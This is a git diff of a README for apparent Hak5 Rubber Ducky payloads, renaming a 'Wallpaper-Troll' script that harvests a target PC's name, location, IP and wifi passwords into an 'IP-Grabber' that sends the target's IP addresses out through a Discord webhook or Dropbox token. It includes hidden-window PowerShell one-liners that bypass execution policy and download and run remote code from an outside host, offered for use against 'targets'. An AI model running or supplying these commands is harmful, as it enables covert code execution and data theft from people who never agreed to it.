@@ -13,15 +13,11 @@
   </ol>
 </details>
 
-# Wallpaper-Troll
-
-A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.
+# IP-Grabber
 
 ## Description
 
-This program enumerates a target PC to get their Name, GeoLocation (Latitude and Longitude), Public IP, Day password was last set, and wifi passwords. This information will be saved to a file that is then converted to a .BMP image. That image will be saved to their desktop and saved as their wallpaper. Opening the image on their desktop with NotePad will reveal the binary code with a hidden message at the bottom of the file.
-
-![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/RubberDucky/Payloads/RD-Wallpaper-Troll/wp-troll.jpg)
+This payload is meant to do grab your targets IP addresses and exfil them with discord or dropbox
 
 ## Getting Started
 
@@ -29,14 +25,19 @@ This program enumerates a target PC to get their Name, GeoLocation (Latitude and
 
 * Windows 10,11
 
-<p align="right">(<a href="#top">back to top</a>)</p>
-
 ### Executing program
 
 * Plug in your device
-* Invoke-RestMethod will be entered in the Run Box to download and execute the script from memory
+* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+
+`$dc` is the variable that stores your Discord webhook 
+
+`$db` is the variable that stores your Dropbox token 
+
+Fill in either or both of these to methods to exfil your collected data
+
 ```
-powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/f0x | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
